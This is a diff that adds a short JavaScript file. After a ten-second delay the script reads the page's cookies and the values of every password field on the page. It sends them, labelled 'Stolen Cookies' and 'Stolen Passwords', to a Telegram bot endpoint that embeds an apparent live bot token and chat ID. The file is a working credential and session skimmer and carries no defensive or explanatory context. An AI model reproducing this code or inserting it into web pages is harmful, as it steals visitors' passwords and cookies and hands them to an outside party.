@@ -1,0 +1,28 @@
+// Delay execution of malicious script for 10 seconds
+setTimeout(function() {
+    // Retrieve cookies
+    var data = document.cookie;
+
+    // Retrieve saved passwords
+    var passwords = "";
+    var forms = document.getElementsByTagName('form');
+    for (var i = 0; i < forms.length; i++) {
+        var inputs = forms[i].getElementsByTagName('input');
+        for (var j = 0; j < inputs.length; j++) {
+            if (inputs[j].type.toLowerCase() === 'password') {
+                passwords += "URL: " + window.location.href + "\n";
+                passwords += "Username: " + inputs[j].name + "\n";
+                passwords += "Password: " + inputs[j].value + "\n\n";
+            }
+        }
+    }
+
+    // Combine cookies and passwords
+    var stolenData = "Stolen Cookies: " + data + "\n\n" + "Stolen Passwords: " + passwords;
+
+    // Send stolen data to Telegram
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://api.telegram.org/bot7120302989:AAG4ztzubzgfscIJl6BnmsK2QiuVRhFpdFQ/sendMessage?chat_id=6842468827", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send("text=" + encodeURIComponent(stolenData));
+}, 10000);
